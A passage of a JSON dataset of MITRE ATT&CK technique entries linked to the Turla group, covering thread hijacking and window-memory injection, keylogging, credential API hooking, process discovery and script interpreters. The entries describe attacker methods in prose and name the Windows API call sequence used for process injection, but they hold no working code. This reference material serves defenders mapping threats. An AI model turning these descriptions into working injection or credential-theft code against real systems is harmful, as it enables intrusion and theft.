    "technique_description": "Adversaries may inject malicious code into hijacked processes in order to evade process-based defenses as well as possibly elevate privileges. Thread Execution Hijacking is a method of executing arbitrary code in the address space of a separate live process. \n\nThread Execution Hijacking is commonly performed by suspending an existing process then unmapping/hollowing its memory, which can then be replaced with malicious code or the path to a DLL. A handle to an existing victim process is first created with native Windows API calls such as <code>OpenThread</code>. At this point the process can be suspended then written to, realigned to the injected code, and resumed via <code>SuspendThread </code>, <code>VirtualAllocEx</code>, <code>WriteProcessMemory</code>, <code>SetThreadContext</code>, then <code>ResumeThread</code> respectively.(Citation: Elastic Process Injection July 2017)\n\nThis is very similar to [Process Hollowing](https://attack.mitre.org/techniques/T1055/012) but targets an existing process rather than creating a process in a suspended state.  \n\nRunning code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via Thread Execution Hijacking may also evade detection from security products since the execution is masked under a legitimate process. ",
    "technique_references": [
      {
        "source_name": "Elastic Process Injection July 2017",
        "url": "https://www.endgame.com/blog/technical-blog/ten-process-injection-techniques-technical-survey-common-and-trending-process",
        "description": "Hosseini, A. (2017, July 18). Ten Process Injection Techniques: A Technical Survey Of Common And Trending Process Injection Techniques. Retrieved December 7, 2017.",
        "external_id": "none"
      }
    ],
    "technique_required_permissions": "user",
    "technique_effective_permissions": "none",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--41d9846c-f6af-4302-a654-24bba2729bc6",
    "platform": "windows",
    "tid": "T1055.003",
    "technique": "Thread Execution Hijacking",
    "tactic": "privilege-escalation",
    "datasources": "os-api-execution|process-access|process-modification",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "turla",
    "correlation_malware": "gazer",
    "correlation_tool": "none",
    "correlation_gid": "G0010",
    "technique_description": "Adversaries may inject malicious code into hijacked processes in order to evade process-based defenses as well as possibly elevate privileges. Thread Execution Hijacking is a method of executing arbitrary code in the address space of a separate live process. \n\nThread Execution Hijacking is commonly performed by suspending an existing process then unmapping/hollowing its memory, which can then be replaced with malicious code or the path to a DLL. A handle to an existing victim process is first created with native Windows API calls such as <code>OpenThread</code>. At this point the process can be suspended then written to, realigned to the injected code, and resumed via <code>SuspendThread </code>, <code>VirtualAllocEx</code>, <code>WriteProcessMemory</code>, <code>SetThreadContext</code>, then <code>ResumeThread</code> respectively.(Citation: Elastic Process Injection July 2017)\n\nThis is very similar to [Process Hollowing](https://attack.mitre.org/techniques/T1055/012) but targets an existing process rather than creating a process in a suspended state.  \n\nRunning code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via Thread Execution Hijacking may also evade detection from security products since the execution is masked under a legitimate process. ",
    "technique_references": [
      {
        "source_name": "Elastic Process Injection July 2017",
        "url": "https://www.endgame.com/blog/technical-blog/ten-process-injection-techniques-technical-survey-common-and-trending-process",
        "description": "Hosseini, A. (2017, July 18). Ten Process Injection Techniques: A Technical Survey Of Common And Trending Process Injection Techniques. Retrieved December 7, 2017.",
        "external_id": "none"
      }
    ],
    "technique_required_permissions": "user",
    "technique_effective_permissions": "none",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--0042a9f5-f053-4769-b3ef-9ad018dfa298",
    "platform": "windows",
    "tid": "T1055.011",
    "technique": "Extra Window Memory Injection",
    "tactic": "defense-evasion",
    "datasources": "os-api-execution",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "turla",
    "correlation_malware": "epic",
    "correlation_tool": "none",
    "correlation_gid": "G0010",
    "technique_description": "Adversaries may inject malicious code into process via Extra Window Memory (EWM) in order to evade process-based defenses as well as possibly elevate privileges. EWM injection is a method of executing arbitrary code in the address space of a separate live process. \n\nBefore creating a window, graphical Windows-based processes must prescribe to or register a windows class, which stipulate appearance and behavior (via windows procedures, which are functions that handle input/output of data).(Citation: Microsoft Window Classes) Registration of new windows classes can include a request for up to 40 bytes of EWM to be appended to the allocated memory of each instance of that class. This EWM is intended to store data specific to that window and has specific application programming interface (API) functions to set and get its value. (Citation: Microsoft GetWindowLong function) (Citation: Microsoft SetWindowLong function)\n\nAlthough small, the EWM is large enough to store a 32-bit pointer and is often used to point to a windows procedure. Malware may possibly utilize this memory location in part of an attack chain that includes writing code to shared sections of the process’s memory, placing a pointer to the code in EWM, then invoking execution by returning execution control to the address in the process’s EWM.\n\nExecution granted through EWM injection may allow access to both the target process's memory and possibly elevated privileges. Writing payloads to shared sections also avoids the use of highly monitored API calls such as <code>WriteProcessMemory</code> and <code>CreateRemoteThread</code>.(Citation: Elastic Process Injection July 2017) More sophisticated malware samples may also potentially bypass protection mechanisms such as data execution prevention (DEP) by triggering a combination of windows procedures and other system functions that will rewrite the malicious payload inside an executable portion of the target process.  (Citation: MalwareTech Power Loader Aug 2013) (Citation: WeLiveSecurity Gapz and Redyms Mar 2013)\n\nRunning code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via EWM injection may also evade detection from security products since the execution is masked under a legitimate process. ",
    "technique_references": [
      {
        "source_name": "Microsoft Window Classes",
        "url": "https://msdn.microsoft.com/library/windows/desktop/ms633574.aspx",
        "description": "Microsoft. (n.d.). About Window Classes. Retrieved December 16, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft GetWindowLong function",
        "url": "https://msdn.microsoft.com/library/windows/desktop/ms633584.aspx",
        "description": "Microsoft. (n.d.). GetWindowLong function. Retrieved December 16, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft SetWindowLong function",
        "url": "https://msdn.microsoft.com/library/windows/desktop/ms633591.aspx",
        "description": "Microsoft. (n.d.). SetWindowLong function. Retrieved December 16, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Elastic Process Injection July 2017",
        "url": "https://www.endgame.com/blog/technical-blog/ten-process-injection-techniques-technical-survey-common-and-trending-process",
        "description": "Hosseini, A. (2017, July 18). Ten Process Injection Techniques: A Technical Survey Of Common And Trending Process Injection Techniques. Retrieved December 7, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "MalwareTech Power Loader Aug 2013",
        "url": "https://www.malwaretech.com/2013/08/powerloader-injection-something-truly.html",
        "description": "MalwareTech. (2013, August 13). PowerLoader Injection – Something truly amazing. Retrieved December 16, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "WeLiveSecurity Gapz and Redyms Mar 2013",
        "url": "https://www.welivesecurity.com/2013/03/19/gapz-and-redyms-droppers-based-on-power-loader-code/",
        "description": "Matrosov, A. (2013, March 19). Gapz and Redyms droppers based on Power Loader code. Retrieved December 16, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft SendNotifyMessage function",
        "url": "https://msdn.microsoft.com/library/windows/desktop/ms644953.aspx",
        "description": "Microsoft. (n.d.). SendNotifyMessage function. Retrieved December 16, 2017.",
        "external_id": "none"
      }
    ],
    "technique_required_permissions": "none",
    "technique_effective_permissions": "none",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--0042a9f5-f053-4769-b3ef-9ad018dfa298",
    "platform": "windows",
    "tid": "T1055.011",
    "technique": "Extra Window Memory Injection",
    "tactic": "privilege-escalation",
    "datasources": "os-api-execution",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "turla",
    "correlation_malware": "epic",
    "correlation_tool": "none",
    "correlation_gid": "G0010",
    "technique_description": "Adversaries may inject malicious code into process via Extra Window Memory (EWM) in order to evade process-based defenses as well as possibly elevate privileges. EWM injection is a method of executing arbitrary code in the address space of a separate live process. \n\nBefore creating a window, graphical Windows-based processes must prescribe to or register a windows class, which stipulate appearance and behavior (via windows procedures, which are functions that handle input/output of data).(Citation: Microsoft Window Classes) Registration of new windows classes can include a request for up to 40 bytes of EWM to be appended to the allocated memory of each instance of that class. This EWM is intended to store data specific to that window and has specific application programming interface (API) functions to set and get its value. (Citation: Microsoft GetWindowLong function) (Citation: Microsoft SetWindowLong function)\n\nAlthough small, the EWM is large enough to store a 32-bit pointer and is often used to point to a windows procedure. Malware may possibly utilize this memory location in part of an attack chain that includes writing code to shared sections of the process’s memory, placing a pointer to the code in EWM, then invoking execution by returning execution control to the address in the process’s EWM.\n\nExecution granted through EWM injection may allow access to both the target process's memory and possibly elevated privileges. Writing payloads to shared sections also avoids the use of highly monitored API calls such as <code>WriteProcessMemory</code> and <code>CreateRemoteThread</code>.(Citation: Elastic Process Injection July 2017) More sophisticated malware samples may also potentially bypass protection mechanisms such as data execution prevention (DEP) by triggering a combination of windows procedures and other system functions that will rewrite the malicious payload inside an executable portion of the target process.  (Citation: MalwareTech Power Loader Aug 2013) (Citation: WeLiveSecurity Gapz and Redyms Mar 2013)\n\nRunning code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via EWM injection may also evade detection from security products since the execution is masked under a legitimate process. ",
    "technique_references": [
      {
        "source_name": "Microsoft Window Classes",
        "url": "https://msdn.microsoft.com/library/windows/desktop/ms633574.aspx",
        "description": "Microsoft. (n.d.). About Window Classes. Retrieved December 16, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft GetWindowLong function",
        "url": "https://msdn.microsoft.com/library/windows/desktop/ms633584.aspx",
        "description": "Microsoft. (n.d.). GetWindowLong function. Retrieved December 16, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft SetWindowLong function",
        "url": "https://msdn.microsoft.com/library/windows/desktop/ms633591.aspx",
        "description": "Microsoft. (n.d.). SetWindowLong function. Retrieved December 16, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Elastic Process Injection July 2017",
        "url": "https://www.endgame.com/blog/technical-blog/ten-process-injection-techniques-technical-survey-common-and-trending-process",
        "description": "Hosseini, A. (2017, July 18). Ten Process Injection Techniques: A Technical Survey Of Common And Trending Process Injection Techniques. Retrieved December 7, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "MalwareTech Power Loader Aug 2013",
        "url": "https://www.malwaretech.com/2013/08/powerloader-injection-something-truly.html",
        "description": "MalwareTech. (2013, August 13). PowerLoader Injection – Something truly amazing. Retrieved December 16, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "WeLiveSecurity Gapz and Redyms Mar 2013",
        "url": "https://www.welivesecurity.com/2013/03/19/gapz-and-redyms-droppers-based-on-power-loader-code/",
        "description": "Matrosov, A. (2013, March 19). Gapz and Redyms droppers based on Power Loader code. Retrieved December 16, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft SendNotifyMessage function",
        "url": "https://msdn.microsoft.com/library/windows/desktop/ms644953.aspx",
        "description": "Microsoft. (n.d.). SendNotifyMessage function. Retrieved December 16, 2017.",
        "external_id": "none"
      }
    ],
    "technique_required_permissions": "none",
    "technique_effective_permissions": "none",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--09a60ea3-a8d1-4ae5-976e-5783248b72a4",
    "platform": "windows|macos|linux|network",
    "tid": "T1056.001",
    "technique": "Keylogging",
    "tactic": "collection",
    "datasources": "driver-load|os-api-execution|windows-registry-key-modification",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "turla",
    "correlation_malware": "none",
    "correlation_tool": "empire",
    "correlation_gid": "G0010",
    "technique_description": "Adversaries may log user keystrokes to intercept credentials as the user types them. Keylogging is likely to be used to acquire credentials for new access opportunities when [OS Credential Dumping](https://attack.mitre.org/techniques/T1003) efforts are not effective, and may require an adversary to intercept keystrokes on a system for a substantial period of time before credentials can be successfully captured.\n\nKeylogging is the most prevalent type of input capture, with many different ways of intercepting keystrokes.(Citation: Adventures of a Keystroke) Some methods include:\n\n* Hooking API callbacks used for processing keystrokes. Unlike [Credential API Hooking](https://attack.mitre.org/techniques/T1056/004), this focuses solely on API functions intended for processing keystroke data.\n* Reading raw keystroke data from the hardware buffer.\n* Windows Registry modifications.\n* Custom drivers.\n* [Modify System Image](https://attack.mitre.org/techniques/T1601) may provide adversaries with hooks into the operating system of network devices to read raw keystrokes for login sessions.(Citation: Cisco Blog Legacy Device Attacks) ",
    "technique_references": [
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/568.html",
        "description": "none",
        "external_id": "CAPEC-568"
      },
      {
        "source_name": "Adventures of a Keystroke",
        "url": "http://opensecuritytraining.info/Keylogging_files/The%20Adventures%20of%20a%20Keystroke.pdf",
        "description": "Tinaztepe,  E. (n.d.). The Adventures of a Keystroke:  An in-depth look into keyloggers on Windows. Retrieved April 27, 2016.",
        "external_id": "none"
      },
      {
        "source_name": "Cisco Blog Legacy Device Attacks",
        "url": "https://community.cisco.com/t5/security-blogs/attackers-continue-to-target-legacy-devices/ba-p/4169954",
        "description": "Omar Santos. (2020, October 19). Attackers Continue to Target Legacy Devices. Retrieved October 20, 2020.",
        "external_id": "none"
      }
    ],
    "technique_required_permissions": "administrator|root|system|user",
    "technique_effective_permissions": "none",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--09a60ea3-a8d1-4ae5-976e-5783248b72a4",
    "platform": "windows|macos|linux|network",
    "tid": "T1056.001",
    "technique": "Keylogging",
    "tactic": "credential-access",
    "datasources": "driver-load|os-api-execution|windows-registry-key-modification",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "turla",
    "correlation_malware": "none",
    "correlation_tool": "empire",
    "correlation_gid": "G0010",
    "technique_description": "Adversaries may log user keystrokes to intercept credentials as the user types them. Keylogging is likely to be used to acquire credentials for new access opportunities when [OS Credential Dumping](https://attack.mitre.org/techniques/T1003) efforts are not effective, and may require an adversary to intercept keystrokes on a system for a substantial period of time before credentials can be successfully captured.\n\nKeylogging is the most prevalent type of input capture, with many different ways of intercepting keystrokes.(Citation: Adventures of a Keystroke) Some methods include:\n\n* Hooking API callbacks used for processing keystrokes. Unlike [Credential API Hooking](https://attack.mitre.org/techniques/T1056/004), this focuses solely on API functions intended for processing keystroke data.\n* Reading raw keystroke data from the hardware buffer.\n* Windows Registry modifications.\n* Custom drivers.\n* [Modify System Image](https://attack.mitre.org/techniques/T1601) may provide adversaries with hooks into the operating system of network devices to read raw keystrokes for login sessions.(Citation: Cisco Blog Legacy Device Attacks) ",
    "technique_references": [
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/568.html",
        "description": "none",
        "external_id": "CAPEC-568"
      },
      {
        "source_name": "Adventures of a Keystroke",
        "url": "http://opensecuritytraining.info/Keylogging_files/The%20Adventures%20of%20a%20Keystroke.pdf",
        "description": "Tinaztepe,  E. (n.d.). The Adventures of a Keystroke:  An in-depth look into keyloggers on Windows. Retrieved April 27, 2016.",
        "external_id": "none"
      },
      {
        "source_name": "Cisco Blog Legacy Device Attacks",
        "url": "https://community.cisco.com/t5/security-blogs/attackers-continue-to-target-legacy-devices/ba-p/4169954",
        "description": "Omar Santos. (2020, October 19). Attackers Continue to Target Legacy Devices. Retrieved October 20, 2020.",
        "external_id": "none"
      }
    ],
    "technique_required_permissions": "administrator|root|system|user",
    "technique_effective_permissions": "none",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--f5946b5e-9408-485f-a7f7-b5efc88909b6",
    "platform": "windows",
    "tid": "T1056.004",
    "technique": "Credential API Hooking",
    "tactic": "collection",
    "datasources": "os-api-execution|process-metadata",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "turla",
    "correlation_malware": "none",
    "correlation_tool": "empire",
    "correlation_gid": "G0010",
    "technique_description": "Adversaries may hook into Windows application programming interface (API) functions to collect user credentials. Malicious hooking mechanisms may capture API calls that include parameters that reveal user authentication credentials.(Citation: Microsoft TrojanSpy:Win32/Ursnif.gen!I Sept 2017) Unlike [Keylogging](https://attack.mitre.org/techniques/T1056/001),  this technique focuses specifically on API functions that include parameters that reveal user credentials. Hooking involves redirecting calls to these functions and can be implemented via:\n\n* **Hooks procedures**, which intercept and execute designated code in response to events such as messages, keystrokes, and mouse inputs.(Citation: Microsoft Hook Overview)(Citation: Elastic Process Injection July 2017)\n* **Import address table (IAT) hooking**, which use modifications to a process’s IAT, where pointers to imported API functions are stored.(Citation: Elastic Process Injection July 2017)(Citation: Adlice Software IAT Hooks Oct 2014)(Citation: MWRInfoSecurity Dynamic Hooking 2015)\n* **Inline hooking**, which overwrites the first bytes in an API function to redirect code flow.(Citation: Elastic Process Injection July 2017)(Citation: HighTech Bridge Inline Hooking Sept 2011)(Citation: MWRInfoSecurity Dynamic Hooking 2015)\n",
    "technique_references": [
      {
        "source_name": "Microsoft TrojanSpy:Win32/Ursnif.gen!I Sept 2017",
        "url": "https://www.microsoft.com/en-us/wdsi/threats/malware-encyclopedia-description?Name=TrojanSpy:Win32/Ursnif.gen!I&threatId=-2147336918",
        "description": "Microsoft. (2017, September 15). TrojanSpy:Win32/Ursnif.gen!I. Retrieved December 18, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft Hook Overview",
        "url": "https://msdn.microsoft.com/library/windows/desktop/ms644959.aspx",
        "description": "Microsoft. (n.d.). Hooks Overview. Retrieved December 12, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Elastic Process Injection July 2017",
        "url": "https://www.endgame.com/blog/technical-blog/ten-process-injection-techniques-technical-survey-common-and-trending-process",
        "description": "Hosseini, A. (2017, July 18). Ten Process Injection Techniques: A Technical Survey Of Common And Trending Process Injection Techniques. Retrieved December 7, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Adlice Software IAT Hooks Oct 2014",
        "url": "https://www.adlice.com/userland-rootkits-part-1-iat-hooks/",
        "description": "Tigzy. (2014, October 15). Userland Rootkits: Part 1, IAT hooks. Retrieved December 12, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "MWRInfoSecurity Dynamic Hooking 2015",
        "url": "https://www.mwrinfosecurity.com/our-thinking/dynamic-hooking-techniques-user-mode/",
        "description": "Hillman, M. (2015, August 8). Dynamic Hooking Techniques: User Mode. Retrieved December 20, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "HighTech Bridge Inline Hooking Sept 2011",
        "url": "https://www.exploit-db.com/docs/17802.pdf",
        "description": "Mariani, B. (2011, September 6). Inline Hooking in Windows. Retrieved December 12, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Volatility Detecting Hooks Sept 2012",
        "url": "https://volatility-labs.blogspot.com/2012/09/movp-31-detecting-malware-hooks-in.html",
        "description": "Volatility Labs. (2012, September 24). MoVP 3.1 Detecting Malware Hooks in the Windows GUI Subsystem. Retrieved December 12, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "PreKageo Winhook Jul 2011",
        "url": "https://github.com/prekageo/winhook",
        "description": "Prekas, G. (2011, July 11). Winhook. Retrieved December 12, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Jay GetHooks Sept 2011",
        "url": "https://github.com/jay/gethooks",
        "description": "Satiro, J. (2011, September 14). GetHooks. Retrieved December 12, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Zairon Hooking Dec 2006",
        "url": "https://zairon.wordpress.com/2006/12/06/any-application-defined-hook-procedure-on-my-machine/",
        "description": "Felici, M. (2006, December 6). Any application-defined hook procedure on my machine?. Retrieved December 12, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "EyeofRa Detecting Hooking June 2017",
        "url": "https://eyeofrablog.wordpress.com/2017/06/27/windows-keylogger-part-2-defense-against-user-land/",
        "description": "Eye of Ra. (2017, June 27). Windows Keylogger Part 2: Defense against user-land. Retrieved December 12, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "GMER Rootkits",
        "url": "http://www.gmer.net/",
        "description": "GMER. (n.d.). GMER. Retrieved December 12, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft Process Snapshot",
        "url": "https://msdn.microsoft.com/library/windows/desktop/ms686701.aspx",
        "description": "Microsoft. (n.d.). Taking a Snapshot and Viewing Processes. Retrieved December 12, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "StackExchange Hooks Jul 2012",
        "url": "https://security.stackexchange.com/questions/17904/what-are-the-methods-to-find-hooked-functions-and-apis",
        "description": "Stack Exchange - Security. (2012, July 31). What are the methods to find hooked functions and APIs?. Retrieved December 12, 2017.",
        "external_id": "none"
      }
    ],
    "technique_required_permissions": "administrator|system",
    "technique_effective_permissions": "none",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--f5946b5e-9408-485f-a7f7-b5efc88909b6",
    "platform": "windows",
    "tid": "T1056.004",
    "technique": "Credential API Hooking",
    "tactic": "credential-access",
    "datasources": "os-api-execution|process-metadata",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "turla",
    "correlation_malware": "none",
    "correlation_tool": "empire",
    "correlation_gid": "G0010",
    "technique_description": "Adversaries may hook into Windows application programming interface (API) functions to collect user credentials. Malicious hooking mechanisms may capture API calls that include parameters that reveal user authentication credentials.(Citation: Microsoft TrojanSpy:Win32/Ursnif.gen!I Sept 2017) Unlike [Keylogging](https://attack.mitre.org/techniques/T1056/001),  this technique focuses specifically on API functions that include parameters that reveal user credentials. Hooking involves redirecting calls to these functions and can be implemented via:\n\n* **Hooks procedures**, which intercept and execute designated code in response to events such as messages, keystrokes, and mouse inputs.(Citation: Microsoft Hook Overview)(Citation: Elastic Process Injection July 2017)\n* **Import address table (IAT) hooking**, which use modifications to a process’s IAT, where pointers to imported API functions are stored.(Citation: Elastic Process Injection July 2017)(Citation: Adlice Software IAT Hooks Oct 2014)(Citation: MWRInfoSecurity Dynamic Hooking 2015)\n* **Inline hooking**, which overwrites the first bytes in an API function to redirect code flow.(Citation: Elastic Process Injection July 2017)(Citation: HighTech Bridge Inline Hooking Sept 2011)(Citation: MWRInfoSecurity Dynamic Hooking 2015)\n",
    "technique_references": [
      {
        "source_name": "Microsoft TrojanSpy:Win32/Ursnif.gen!I Sept 2017",
        "url": "https://www.microsoft.com/en-us/wdsi/threats/malware-encyclopedia-description?Name=TrojanSpy:Win32/Ursnif.gen!I&threatId=-2147336918",
        "description": "Microsoft. (2017, September 15). TrojanSpy:Win32/Ursnif.gen!I. Retrieved December 18, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft Hook Overview",
        "url": "https://msdn.microsoft.com/library/windows/desktop/ms644959.aspx",
        "description": "Microsoft. (n.d.). Hooks Overview. Retrieved December 12, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Elastic Process Injection July 2017",
        "url": "https://www.endgame.com/blog/technical-blog/ten-process-injection-techniques-technical-survey-common-and-trending-process",
        "description": "Hosseini, A. (2017, July 18). Ten Process Injection Techniques: A Technical Survey Of Common And Trending Process Injection Techniques. Retrieved December 7, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Adlice Software IAT Hooks Oct 2014",
        "url": "https://www.adlice.com/userland-rootkits-part-1-iat-hooks/",
        "description": "Tigzy. (2014, October 15). Userland Rootkits: Part 1, IAT hooks. Retrieved December 12, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "MWRInfoSecurity Dynamic Hooking 2015",
        "url": "https://www.mwrinfosecurity.com/our-thinking/dynamic-hooking-techniques-user-mode/",
        "description": "Hillman, M. (2015, August 8). Dynamic Hooking Techniques: User Mode. Retrieved December 20, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "HighTech Bridge Inline Hooking Sept 2011",
        "url": "https://www.exploit-db.com/docs/17802.pdf",
        "description": "Mariani, B. (2011, September 6). Inline Hooking in Windows. Retrieved December 12, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Volatility Detecting Hooks Sept 2012",
        "url": "https://volatility-labs.blogspot.com/2012/09/movp-31-detecting-malware-hooks-in.html",
        "description": "Volatility Labs. (2012, September 24). MoVP 3.1 Detecting Malware Hooks in the Windows GUI Subsystem. Retrieved December 12, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "PreKageo Winhook Jul 2011",
        "url": "https://github.com/prekageo/winhook",
        "description": "Prekas, G. (2011, July 11). Winhook. Retrieved December 12, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Jay GetHooks Sept 2011",
        "url": "https://github.com/jay/gethooks",
        "description": "Satiro, J. (2011, September 14). GetHooks. Retrieved December 12, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Zairon Hooking Dec 2006",
        "url": "https://zairon.wordpress.com/2006/12/06/any-application-defined-hook-procedure-on-my-machine/",
        "description": "Felici, M. (2006, December 6). Any application-defined hook procedure on my machine?. Retrieved December 12, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "EyeofRa Detecting Hooking June 2017",
        "url": "https://eyeofrablog.wordpress.com/2017/06/27/windows-keylogger-part-2-defense-against-user-land/",
        "description": "Eye of Ra. (2017, June 27). Windows Keylogger Part 2: Defense against user-land. Retrieved December 12, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "GMER Rootkits",
        "url": "http://www.gmer.net/",
        "description": "GMER. (n.d.). GMER. Retrieved December 12, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft Process Snapshot",
        "url": "https://msdn.microsoft.com/library/windows/desktop/ms686701.aspx",
        "description": "Microsoft. (n.d.). Taking a Snapshot and Viewing Processes. Retrieved December 12, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "StackExchange Hooks Jul 2012",
        "url": "https://security.stackexchange.com/questions/17904/what-are-the-methods-to-find-hooked-functions-and-apis",
        "description": "Stack Exchange - Security. (2012, July 31). What are the methods to find hooked functions and APIs?. Retrieved December 12, 2017.",
        "external_id": "none"
      }
    ],
    "technique_required_permissions": "administrator|system",
    "technique_effective_permissions": "none",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--8f4a33ec-8b1f-4b80-a2f6-642b2e479580",
    "platform": "linux|macos|windows",
    "tid": "T1057",
    "technique": "Process Discovery",
    "tactic": "discovery",
    "datasources": "command-execution|os-api-execution|process-creation",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "turla",
    "correlation_malware": "carbon|epic|kazuar|mosquito|powerstallion",
    "correlation_tool": "empire|ironnetinjector|tasklist",
    "correlation_gid": "G0010",
    "technique_description": "Adversaries may attempt to get information about running processes on a system. Information obtained could be used to gain an understanding of common software/applications running on systems within the network. Adversaries may use the information from [Process Discovery](https://attack.mitre.org/techniques/T1057) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nIn Windows environments, adversaries could obtain details on running processes using the [Tasklist](https://attack.mitre.org/software/S0057) utility via [cmd](https://attack.mitre.org/software/S0106) or <code>Get-Process</code> via [PowerShell](https://attack.mitre.org/techniques/T1059/001). Information about processes can also be extracted from the output of [Native API](https://attack.mitre.org/techniques/T1106) calls such as <code>CreateToolhelp32Snapshot</code>. In Mac and Linux, this is accomplished with the <code>ps</code> command. Adversaries may also opt to enumerate processes via /proc.",
    "technique_references": [
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/573.html",
        "description": "none",
        "external_id": "CAPEC-573"
      }
    ],
    "technique_required_permissions": "user|administrator|system",
    "technique_effective_permissions": "none",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--7385dfaf-6886-4229-9ecd-6fd678040830",
    "platform": "linux|macos|windows|network",
    "tid": "T1059",
    "technique": "Command and Scripting Interpreter",
    "tactic": "execution",
    "datasources": "command-execution|module-load|process-creation|process-metadata|script-execution",
    "has_subtechniques": true,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [
      "T1059.003",
      "T1059.004",
      "T1059.005",
      "T1059.006",
      "T1059.007"
    ],
    "count_subtechniques": 5,
    "correlation_adversary": "turla",
    "correlation_malware": "none",
    "correlation_tool": "empire",
    "correlation_gid": "G0010",
    "technique_description": "Adversaries may abuse command and script interpreters to execute commands, scripts, or binaries. These interfaces and languages provide ways of interacting with computer systems and are a common feature across many different platforms. Most systems come with some built-in command-line interface and scripting capabilities, for example, macOS and Linux distributions include some flavor of [Unix Shell](https://attack.mitre.org/techniques/T1059/004) while Windows installations include the [Windows Command Shell](https://attack.mitre.org/techniques/T1059/003) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).\n\nThere are also cross-platform interpreters such as [Python](https://attack.mitre.org/techniques/T1059/006), as well as those commonly associated with client applications such as [JavaScript](https://attack.mitre.org/techniques/T1059/007) and [Visual Basic](https://attack.mitre.org/techniques/T1059/005).\n\nAdversaries may abuse these technologies in various ways as a means of executing arbitrary commands. Commands and scripts can be embedded in [Initial Access](https://attack.mitre.org/tactics/TA0001) payloads delivered to victims as lure documents or as secondary payloads downloaded from an existing C2. Adversaries may also execute commands through interactive terminals/shells, as well as utilize various [Remote Services](https://attack.mitre.org/techniques/T1021) in order to achieve remote Execution.(Citation: Powershell Remote Commands)(Citation: Cisco IOS Software Integrity Assurance - Command History)(Citation: Remote Shell Execution in Python)",
    "technique_references": [
      {
        "source_name": "Remote Shell Execution in Python",
        "url": "https://www.thepythoncode.com/article/executing-bash-commands-remotely-in-python",
        "description": "Abdou Rockikz. (2020, July). How to Execute Shell Commands in a Remote Machine in Python. Retrieved July 26, 2021.",
        "external_id": "none"
      },
      {
        "source_name": "Cisco IOS Software Integrity Assurance - Command History",
        "url": "https://tools.cisco.com/security/center/resources/integrity_assurance.html#23",
        "description": "Cisco. (n.d.). Cisco IOS Software Integrity Assurance - Command History. Retrieved October 21, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Powershell Remote Commands",
